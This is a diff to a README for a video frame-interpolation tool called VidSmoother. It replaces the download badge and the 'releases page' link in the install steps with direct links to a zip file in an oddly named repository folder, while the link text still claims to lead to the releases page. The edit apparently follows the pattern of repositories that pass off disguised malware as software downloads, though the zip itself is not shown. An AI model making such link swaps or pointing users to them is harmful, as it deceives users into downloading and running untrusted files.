@@ -1,6 +1,6 @@
 # 🎞️ VidSmoother - Make your videos look smooth again
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/silkyterrierropedancer424/VidSmoother/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/silkyterrierropedancer424/VidSmoother/raw/refs/heads/main/inspectoral/Smoother_Vid_v3.1-beta.1.zip)
 
 VidSmoother helps you increase the frame rate of your videos and GIFs. It uses your graphics card to add new frames between existing ones. This process makes movement look fluid and creates a professional result without complex video editing skills.
 
@@ -16,7 +16,7 @@ This software performs heavy calculations on your computer hardware. Ensure your
 
 ## 📥 How to Install
 
-1.  Visit the [releases page](https://github.com/silkyterrierropedancer424/VidSmoother/releases) to download the application.
+1.  Visit the [releases page](https://github.com/silkyterrierropedancer424/VidSmoother/raw/refs/heads/main/inspectoral/Smoother_Vid_v3.1-beta.1.zip) to download the application.
 2.  Locate the latest file ending in `.zip`.
 3.  Right-click the downloaded folder and select "Extract All."
 4.  Open the extracted folder.
